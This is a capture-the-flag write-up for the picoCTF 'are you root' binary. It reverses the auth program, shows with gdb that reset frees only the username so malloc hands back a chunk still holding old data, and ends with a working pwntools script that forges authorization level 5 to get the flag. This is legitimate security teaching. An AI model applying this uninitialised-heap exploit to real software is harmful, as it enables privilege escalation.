# pico ctf are you root

Let's take a look at the binary:

```
$	file auth 
auth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=42ebad5f08a8e9d227f3783cc951f2737547e086, not stripped
$	pwn checksec auth 
[*] '/Hackery/pod/modules/heap_grooming/pico_areyouroot/auth'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$	./auth 
Available commands:
	show - show your current user and authorization level
	login [name] - log in as [name]
	set-auth [level] - set your authorization level (must be below 5)
	get-flag - print the flag (requires authorization level 5)
	reset - log out and reset authorization level
	quit - exit the program

Enter your command:
> 
```

So we can see that we are dealing with a `64` bit binary, with a Stack Canary and NX. When we run it, we are prompted with a console where we can input arguments.

## Reversing

When we look at the main function in Ghidra, we see this:

```

undefined8 main(void)

{
  int cmdCheck;
  int iVar1;
  int setauthCheck;
  int getflagCheck;
  int resetCheck;
  int quitCheck;
  char *cmdBytesRead;
  char *__nptr;
  char *pcVar2;
  ulong uVar3;
  long in_FS_OFFSET;
  void **loggedIn;
  char cmd [6];
  char acStack530 [3];
  char acStack527 [511];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  menu();
  loggedIn = (void **)0x0;
  while( true ) {
    puts("\nEnter your command:");
    putchar(0x3e);
    putchar(0x20);
    cmdBytesRead = fgets(cmd,0x200,stdin);
    if (cmdBytesRead == (char *)0x0) break;
    cmdCheck = strncmp(cmd,"show",4);
    if (cmdCheck == 0) {
      if (loggedIn == (void **)0x0) {
        puts("Not logged in.");
      }
      else {
        printf("Logged in as %s [%u]\n",*loggedIn,(ulong)*(uint *)(loggedIn + 1));
      }
    }
    else {
      iVar1 = strncmp(cmd,"login",5);
      if (iVar1 == 0) {
        if (loggedIn == (void **)0x0) {
          __nptr = strtok(acStack530,"\n");
          if (__nptr == (char *)0x0) {
            puts("Invalid command");
          }
          else {
            loggedIn = (void **)malloc(0x10);
            if (loggedIn == (void **)0x0) {
              puts("malloc() returned NULL. Out of Memory\n");
                    /* WARNING: Subroutine does not return */
              exit(-1);
            }
            pcVar2 = strdup(__nptr);
            *loggedIn = (void *)(long)(int)pcVar2;
            printf("Logged in as \"%s\"\n",__nptr);
          }
        }
        else {
          puts("Already logged in. Reset first.");
        }
      }
      else {
        setauthCheck = strncmp(cmd,"set-auth",8);
        if (setauthCheck == 0) {
          if (loggedIn == (void **)0x0) {
            puts("Login first.");
          }
          else {
            __nptr = strtok(acStack527,"\n");
            if (__nptr == (char *)0x0) {
              puts("Invalid command");
            }
            else {
              uVar3 = strtoul(__nptr,(char **)0x0,10);
              if ((uint)uVar3 < 5) {
                *(uint *)(loggedIn + 1) = (uint)uVar3;
                printf("Set authorization level to \"%u\"\n",uVar3 & 0xffffffff);
              }
              else {
                puts("Can only set authorization level below 5");
              }
            }
          }
        }
        else {
          getflagCheck = strncmp(cmd,"get-flag",8);
          if (getflagCheck == 0) {
            if (loggedIn == (void **)0x0) {
              puts("Login first!");
            }
            else {
              if (*(int *)(loggedIn + 1) == 5) {
                give_flag();
              }
              else {
                puts("Must have authorization level 5.");
              }
            }
          }
          else {
            resetCheck = strncmp(cmd,"reset",5);
            if (resetCheck == 0) {
              if (loggedIn == (void **)0x0) {
                puts("Not logged in!");
              }
              else {
                free(*loggedIn);
                loggedIn = (void **)0x0;
                puts("Logged out!");
              }
            }
            else {
              quitCheck = strncmp(cmd,"quit",4);
              if (quitCheck == 0) break;
              puts("Invalid option");
              menu();
            }
          }
        }
      }
    }
  }
  if (canary == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

So we can see that it prompts us for input, and checks if it is equal to a command. If it is, then it will run the command. Let's walk through the commands.

For `login` we see this:

```
      iVar1 = strncmp(cmd,"login",5);
      if (iVar1 == 0) {
        if (loggedIn == (void **)0x0) {
          __nptr = strtok(acStack530,"\n");
          if (__nptr == (char *)0x0) {
            puts("Invalid command");
          }
          else {
            loggedIn = (void **)malloc(0x10);
            if (loggedIn == (void **)0x0) {
              puts("malloc() returned NULL. Out of Memory\n");
                    /* WARNING: Subroutine does not return */
              exit(-1);
            }
            pcVar2 = strdup(__nptr);
            *loggedIn = (void *)(long)(int)pcVar2;
            printf("Logged in as \"%s\"\n",__nptr);
          }
        }
        else {
          puts("Already logged in. Reset first.");
        }
      }
```

So we can see, it does a check if we are already logged in. If we aren't then it will log us in, which will create a struct in the heap, which contains the following things:
```
0x0:	ptr to username (stored in heap)
0x8:	int representing auth level
```

For `reset` we see this:

```
            if (resetCheck == 0) {
              if (loggedIn == (void **)0x0) {
                puts("Not logged in!");
              }
              else {
                free(*loggedIn);
                loggedIn = (void **)0x0;
                puts("Logged out!");
              }
            }
```

So for this, if we are logged in, it will log us out. What that does is it frees the pointer for our username, and zeroes it out. However it does not free the user struct itself. For `set-auth` we see this:

```
        if (setauthCheck == 0) {
          if (loggedIn == (void **)0x0) {
            puts("Login first.");
          }
          else {
            __nptr = strtok(acStack527,"\n");
            if (__nptr == (char *)0x0) {
              puts("Invalid command");
            }
            else {
              uVar3 = strtoul(__nptr,(char **)0x0,10);
              if ((uint)uVar3 < 5) {
                *(uint *)(loggedIn + 1) = (uint)uVar3;
                printf("Set authorization level to \"%u\"\n",uVar3 & 0xffffffff);
              }
              else {
                puts("Can only set authorization level below 5");
              }
            }
          }
        }
```

So essentially this allows us to set the auth level, however it has to be below `5`. Lastly when we look at get-flag, we see that it will print the contents of `flag.txt` if we have set our auth level to `5`. So we need to find some way to set our auth level to `5` without using `set-auth`.

## Exploitation 

So one thing about malloc (at least on older versions), it won't clear out memory that has been freed. To get a better look at it, let's login as a user to allocate space on the heap:

```
gef➤  r
Starting program: /home/guyinatuxedo/Downloads/auth 
Available commands:
	show - show your current user and authorization level
	login [name] - log in as [name]
	set-auth [level] - set your authorization level (must be below 5)
	get-flag - print the flag (requires authorization level 5)
	reset - log out and reset authorization level
	quit - exit the program

Enter your command:
> login 0000000000000000
Logged in as "0000000000000000"

Enter your command:
> set-auth 4
Set authorization level to "4"

Enter your command:
> ^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b04260 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x00007ffff7dd18e0  →  0x00000000fbad2288
$rcx   : 0x00007ffff7b04260  →  <__read_nocancel+7> cmp rax, 0xfffffffffffff001
$rdx   : 0x400             
$rsp   : 0x00007fffffffdba8  →  0x00007ffff7a875e8  →  <_IO_file_underflow+328> cmp rax, 0x0
$rbp   : 0x00007ffff7dd2620  →  0x00000000fbad2887
$rsi   : 0x0000000000603010  →  "set-auth 4\n00000000000"
$rdi   : 0x0               
$rip   : 0x00007ffff7b04260  →  <__read_nocancel+7> cmp rax, 0xfffffffffffff001
$r8    : 0x00007ffff7dd3780  →  0x0000000000000000
$r9    : 0x00007ffff7fdc700  →  0x00007ffff7fdc700  →  [loop detected]
$r10   : 0x00007ffff7fdc700  →  0x00007ffff7fdc700  →  [loop detected]
$r11   : 0x246             
$r12   : 0xa               
$r13   : 0x1ff             
$r14   : 0x000000000060301b  →  "00000000000"
$r15   : 0x00007ffff7dd18e0  →  0x00000000fbad2288
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdba8│+0x0000: 0x00007ffff7a875e8  →  <_IO_file_underflow+328> cmp rax, 0x0	 ← $rsp
0x00007fffffffdbb0│+0x0008: 0x0000000000000004
0x00007fffffffdbb8│+0x0010: 0x00007ffff7dd18e0  →  0x00000000fbad2288
0x00007fffffffdbc0│+0x0018: 0x00007fffffffdc90  →  "set-auth 4"
0x00007fffffffdbc8│+0x0020: 0x00007ffff7a8860e  →  <_IO_default_uflow+14> cmp eax, 0xffffffff
0x00007fffffffdbd0│+0x0028: 0x0000000000000000
0x00007fffffffdbd8│+0x0030: 0x00007ffff7a7bc6a  →  <_IO_getline_info+170> cmp eax, 0xffffffff
0x00007fffffffdbe0│+0x0038: 0x00007ffff7dd26a3  →  0xdd37800000000020
─────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7b04254 <read+4>         sub    eax, 0x10750000
   0x7ffff7b04259 <__read_nocancel+0> mov    eax, 0x0
   0x7ffff7b0425e <__read_nocancel+5> syscall 
 → 0x7ffff7b04260 <__read_nocancel+7> cmp    rax, 0xfffffffffffff001
   0x7ffff7b04266 <__read_nocancel+13> jae    0x7ffff7b04299 <read+73>
   0x7ffff7b04268 <__read_nocancel+15> ret    
   0x7ffff7b04269 <read+25>        sub    rsp, 0x8
   0x7ffff7b0426d <read+29>        call   0x7ffff7b220d0 <__libc_enable_asynccancel>
   0x7ffff7b04272 <read+34>        mov    QWORD PTR [rsp], rax
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "auth", stopped, reason: SIGINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7b04260 → __read_nocancel()
[#1] 0x7ffff7a875e8 → _IO_new_file_underflow(fp=0x7ffff7dd18e0 <_IO_2_1_stdin_>)
[#2] 0x7ffff7a8860e → __GI__IO_default_uflow(fp=0x7ffff7dd18e0 <_IO_2_1_stdin_>)
[#3] 0x7ffff7a7bc6a → __GI__IO_getline_info(fp=0x7ffff7dd18e0 <_IO_2_1_stdin_>, buf=0x7fffffffdc90 "set-auth 4", n=0x1ff, delim=0xa, extract_delim=0x1, eof=0x0)
[#4] 0x7ffff7a7bd78 → __GI__IO_getline(fp=0x7ffff7dd18e0 <_IO_2_1_stdin_>, buf=0x7fffffffdc90 "set-auth 4", n=<optimized out>, delim=0xa, extract_delim=0x1)
[#5] 0x7ffff7a7ab7d → _IO_fgets(buf=0x7fffffffdc90 "set-auth 4", n=<optimized out>, fp=0x7ffff7dd18e0 <_IO_2_1_stdin_>)
[#6] 0x400b2e → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  search-pattern 0000000000000000
[+] Searching '0000000000000000' in memory
[+] In '[heap]'(0x603000-0x624000), permission=rw-
  0x603440 - 0x603450  →   "0000000000000000" 
[+] In '/lib/x86_64-linux-gnu/libc-2.23.so'(0x7ffff7a0d000-0x7ffff7bcd000), permission=r-x
  0x7ffff7ba1410 - 0x7ffff7ba1420  →   "0000000000000000[...]" 
gef➤  search-pattern 0x603440
[+] Searching '\x40\x34\x60' in memory
[+] In '[heap]'(0x603000-0x624000), permission=rw-
  0x603420 - 0x603423  →   "@4`" 
gef➤  x/10g 0x603410
0x603410:	0x0 		0x21
0x603420:	0x603440	0x4
0x603430:	0x0	0x21
0x603440:	0x3030303030303030	0x3030303030303030
0x603450:	0x0	0x20bb1
```

So we can see here, our user struct which is stored at `0x603420`, and the auth level (`4`). Now we can see that the chunk for the user struct, and the chunk for the actual username are the same size `0x21`. Now for performance reasons, malloc will reuse previously freed chunks if they are a good fit for the size. Now we are going to reset our login which will only free the name (remember this):

```
              else {
                free(*loggedIn);
                loggedIn = (void **)0x0;
                puts("Logged out!");
              }
```

Proceeding that we will allocate a new user struct. Since the size of our user struct and the name chunk are the same, it should reuse our old struct:

```
gef➤  c
Continuing.
reset
Logged out!

Enter your command:
> login 15935728
Logged in as "15935728"

Enter your command:
> ^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b04260 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	in ../sysdeps/unix/syscall-template.S
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x00007ffff7dd18e0  →  0x00000000fbad2288
$rcx   : 0x00007ffff7b04260  →  <__read_nocancel+7> cmp rax, 0xfffffffffffff001
$rdx   : 0x400             
$rsp   : 0x00007fffffffdba8  →  0x00007ffff7a875e8  →  <_IO_file_underflow+328> cmp rax, 0x0
$rbp   : 0x00007ffff7dd2620  →  0x00000000fbad2887
$rsi   : 0x0000000000603010  →  "login 15935728\n0000000"
$rdi   : 0x0               
$rip   : 0x00007ffff7b04260  →  <__read_nocancel+7> cmp rax, 0xfffffffffffff001
$r8    : 0x00007ffff7dd3780  →  0x0000000000000000
$r9    : 0x00007ffff7fdc700  →  0x00007ffff7fdc700  →  [loop detected]
$r10   : 0x00007ffff7fdc700  →  0x00007ffff7fdc700  →  [loop detected]
$r11   : 0x246             
$r12   : 0xa               
$r13   : 0x1ff             
$r14   : 0x000000000060301f  →  0x0a30303030303030 ("0000000"?)
$r15   : 0x00007ffff7dd18e0  →  0x00000000fbad2288
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdba8│+0x0000: 0x00007ffff7a875e8  →  <_IO_file_underflow+328> cmp rax, 0x0	 ← $rsp
0x00007fffffffdbb0│+0x0008: 0x0000000000603460  →  "15935728"
0x00007fffffffdbb8│+0x0010: 0x00007ffff7dd18e0  →  0x00000000fbad2288
0x00007fffffffdbc0│+0x0018: 0x00007fffffffdc90  →  "login 15935728"
0x00007fffffffdbc8│+0x0020: 0x00007ffff7a8860e  →  <_IO_default_uflow+14> cmp eax, 0xffffffff
0x00007fffffffdbd0│+0x0028: 0x0000000000000000
0x00007fffffffdbd8│+0x0030: 0x00007ffff7a7bc6a  →  <_IO_getline_info+170> cmp eax, 0xffffffff
0x00007fffffffdbe0│+0x0038: 0x00007ffff7dd26a3  →  0xdd37800000000020
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7b04254 <read+4>         sub    eax, 0x10750000
   0x7ffff7b04259 <__read_nocancel+0> mov    eax, 0x0
   0x7ffff7b0425e <__read_nocancel+5> syscall 
 → 0x7ffff7b04260 <__read_nocancel+7> cmp    rax, 0xfffffffffffff001
   0x7ffff7b04266 <__read_nocancel+13> jae    0x7ffff7b04299 <read+73>
   0x7ffff7b04268 <__read_nocancel+15> ret    
   0x7ffff7b04269 <read+25>        sub    rsp, 0x8
   0x7ffff7b0426d <read+29>        call   0x7ffff7b220d0 <__libc_enable_asynccancel>
   0x7ffff7b04272 <read+34>        mov    QWORD PTR [rsp], rax
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "auth", stopped, reason: SIGINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7b04260 → __read_nocancel()
[#1] 0x7ffff7a875e8 → _IO_new_file_underflow(fp=0x7ffff7dd18e0 <_IO_2_1_stdin_>)
[#2] 0x7ffff7a8860e → __GI__IO_default_uflow(fp=0x7ffff7dd18e0 <_IO_2_1_stdin_>)
[#3] 0x7ffff7a7bc6a → __GI__IO_getline_info(fp=0x7ffff7dd18e0 <_IO_2_1_stdin_>, buf=0x7fffffffdc90 "login 15935728", n=0x1ff, delim=0xa, extract_delim=0x1, eof=0x0)
[#4] 0x7ffff7a7bd78 → __GI__IO_getline(fp=0x7ffff7dd18e0 <_IO_2_1_stdin_>, buf=0x7fffffffdc90 "login 15935728", n=<optimized out>, delim=0xa, extract_delim=0x1)
[#5] 0x7ffff7a7ab7d → _IO_fgets(buf=0x7fffffffdc90 "login 15935728", n=<optimized out>, fp=0x7ffff7dd18e0 <_IO_2_1_stdin_>)
[#6] 0x400b2e → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  search-pattern 15935728
[+] Searching '15935728' in memory
[+] In '[heap]'(0x603000-0x624000), permission=rw-
  0x603016 - 0x603027  →   "15935728\n0000000" 
  0x603460 - 0x603468  →   "15935728" 
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffb5de - 0x7fffffffb5ef  →   "15935728"\nto "4"" 
  0x7fffffffdc96 - 0x7fffffffdc9e  →   "15935728" 
gef➤  search-pattern 0x603460
[+] Searching '\x60\x34\x60' in memory
[+] In '[heap]'(0x603000-0x624000), permission=rw-
  0x603440 - 0x603443  →   "`4`" 
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffdbb0 - 0x7fffffffdbb3  →   "`4`" 
gef➤  x/8g 0x603440
0x603440:	0x603460	0x3030303030303030
0x603450:	0x0	0x21
0x603460:	0x3832373533393531	0x0
0x603470:	0x0	0x20b91
```

As you can see, it did reuse the old name chunk, however it didn't clear out the old data. As a result, we were able to set the auth level to `0x3030303030303030`. 

Now to set the auth level to `5`, we will essentially be doing the same thing. Except for setting our first username to `0000000000000000`, we will instead be setting it to `00000000\x05`. That way when we allocate the second user chunk, `0x5` will be the value of the auth level.

## Exploit

Putting it all together, we have the following exploit. I noticed that on newer versions of libc, it would clear out freed data which would break this challenge. So I just included `libc-2.23.so` which I ran on Ubuntu 16.04:

```
$	cat exploit.py 
from pwn import *

target = process('./auth', env={"LD_PRELOAD":"./libc-2.23.so"})
#gdb.attach(target)

username = "0"*8 + "\x05"

target.sendline("login " + username)

target.sendline("reset")

target.sendline("login guyintux")

target.sendline("get-flag")

target.interactive()
```

When we run it:

```
$	python exploit.py 
[+] Starting local process './auth': pid 57963
[*] Switching to interactive mode
Available commands:
    show - show your current user and authorization level
    login [name] - log in as [name]
    set-auth [level] - set your authorization level (must be below 5)
    get-flag - print the flag (requires authorization level 5)
    reset - log out and reset authorization level
    quit - exit the program

Enter your command:
> Logged in as "00000000\x05"

Enter your command:
> Logged out!

Enter your command:
> Logged in as "guyintux"

Enter your command:
> flag{g0ttem_b0iz}


Enter your command:
```

Just like that, we captures the flag!